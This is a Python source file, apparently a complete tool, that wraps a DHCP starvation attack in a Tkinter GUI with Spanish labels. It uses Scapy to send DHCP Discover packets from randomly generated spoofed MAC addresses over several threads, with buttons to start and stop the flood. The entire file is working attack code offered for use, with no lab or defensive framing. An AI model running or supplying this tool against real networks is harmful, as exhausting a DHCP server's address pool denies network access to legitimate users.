#!/usr/bin/env python3
from scapy.all import *
import random
import threading
import time
import tkinter as tk
from tkinter import ttk, scrolledtext
from datetime import datetime

# Configuración del ataque
INTERFAZ_RED = "eth0"  # Cambia esto por tu interfaz de red
TARGET_MAC = "ff:ff:ff:ff:ff:ff"  # Broadcast
DHCP_SERVER_IP = "23.72.0.21"  # Cambia por la IP del servidor DHCP real
NUM_THREADS = 10  # Número de hilos para enviar paquetes simultáneamente

class DHCPStarvationGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("DHCP Starvation Attack Tool")
        self.root.geometry("800x600")
        
        # Variables de control
        self.attack_running = False
        self.packets_sent = 0
        self.mac_addresses = []
        
        # Crear interfaz
        self.create_widgets()
        
    def create_widgets(self):
        # Frame principal
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configuración de red
        config_frame = ttk.LabelFrame(main_frame, text="Configuración de Red", padding="10")
        config_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        
        ttk.Label(config_frame, text="Interfaz:").grid(row=0, column=0, sticky=tk.W)
        self.interface_var = tk.StringVar(value=INTERFAZ_RED)
        ttk.Entry(config_frame, textvariable=self.interface_var, width=20).grid(row=0, column=1, padx=5)
        
        ttk.Label(config_frame, text="Servidor DHCP:").grid(row=0, column=2, sticky=tk.W, padx=(20,0))
        self.server_var = tk.StringVar(value=DHCP_SERVER_IP)
        ttk.Entry(config_frame, textvariable=self.server_var, width=15).grid(row=0, column=3, padx=5)
        
        ttk.Label(config_frame, text="Hilos:").grid(row=0, column=4, sticky=tk.W, padx=(20,0))
        self.threads_var = tk.StringVar(value=str(NUM_THREADS))
        ttk.Entry(config_frame, textvariable=self.threads_var, width=5).grid(row=0, column=5, padx=5)
        
        # Estadísticas
        stats_frame = ttk.LabelFrame(main_frame, text="Estadísticas", padding="10")
        stats_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        
        self.packets_label = ttk.Label(stats_frame, text="Paquetes enviados: 0")
        self.packets_label.grid(row=0, column=0, sticky=tk.W)
        
        self.macs_label = ttk.Label(stats_frame, text="MACs generadas: 0")
        self.macs_label.grid(row=0, column=1, sticky=tk.W, padx=(50,0))
        
        # Lista de MACs generadas
        macs_frame = ttk.LabelFrame(main_frame, text="Direcciones MAC Generadas", padding="10")
        macs_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)
        
        self.mac_listbox = tk.Listbox(macs_frame, height=15)
        self.mac_listbox.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        scrollbar = ttk.Scrollbar(macs_frame, orient="vertical", command=self.mac_listbox.yview)
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.mac_listbox.configure(yscrollcommand=scrollbar.set)
        
        # Botones de control
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=3, column=0, columnspan=2, pady=10)
        
        self.start_button = ttk.Button(button_frame, text="Iniciar Ataque", command=self.start_attack)
        self.start_button.grid(row=0, column=0, padx=5)
        
        self.stop_button = ttk.Button(button_frame, text="Detener Ataque", command=self.stop_attack, state="disabled")
        self.stop_button.grid(row=0, column=1, padx=5)
        
        self.clear_button = ttk.Button(button_frame, text="Limpiar Lista", command=self.clear_mac_list)
        self.clear_button.grid(row=0, column=2, padx=5)
        
        # Configurar expansión
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(2, weight=1)
        macs_frame.columnconfigure(0, weight=1)
        macs_frame.rowconfigure(0, weight=1)
        
    def generate_random_mac(self):
        """Genera una dirección MAC aleatoria"""
        return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
        
    def dhcp_starvation_worker(self):
        """Función que realiza el ataque DHCP Starvation en un hilo"""
        while self.attack_running:
            # Generar MAC aleatoria
            random_mac = self.generate_random_mac()
            
            # Construir paquete DHCP Discover
            dhcp_discover = Ether(src=random_mac, dst=TARGET_MAC) / \
                            IP(src="0.0.0.0", dst="255.255.255.255") / \
                            UDP(sport=68, dport=67) / \
                            BOOTP(chaddr=RandMAC()) / \
                            DHCP(options=[("message-type", "discover"), "end"])
            
            # Enviar paquete
            sendp(dhcp_discover, iface=self.interface_var.get(), verbose=False)
            
            # Actualizar estadísticas
            self.packets_sent += 1
            self.mac_addresses.append(random_mac)
            
            # Actualizar GUI en el hilo principal
            self.root.after(0, self.update_gui, random_mac)
            
            # Pausa breve
            time.sleep(0.01)
            
    def update_gui(self, mac):
        """Actualiza la interfaz gráfica con nueva MAC"""
        # Agregar MAC a la lista
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.mac_listbox.insert(tk.END, f"[{timestamp}] {mac}")
        
        # Actualizar contadores
        self.packets_label.config(text=f"Paquetes enviados: {self.packets_sent}")
        self.macs_label.config(text=f"MACs generadas: {len(self.mac_addresses)}")
        
        # Auto-scroll a la última MAC
        self.mac_listbox.see(tk.END)
        
    def start_attack(self):
        """Inicia el ataque DHCP starvation"""
        if not self.attack_running:
            self.attack_running = True
            self.start_button.config(state="disabled")
            self.stop_button.config(state="normal")
            
            # Iniciar hilos de ataque
            num_threads = int(self.threads_var.get())
            for i in range(num_threads):
                t = threading.Thread(target=self.dhcp_starvation_worker)
                t.daemon = True
                t.start()
                
    def stop_attack(self):
        """Detiene el ataque"""
        self.attack_running = False
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")
        
    def clear_mac_list(self):
        """Limpia la lista de MACs"""
        self.mac_listbox.delete(0, tk.END)
        self.mac_addresses.clear()
        self.packets_sent = 0
        self.packets_label.config(text="Paquetes enviados: 0")
        self.macs_label.config(text="MACs generadas: 0")

def main():
    root = tk.Tk()
    app = DHCPStarvationGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()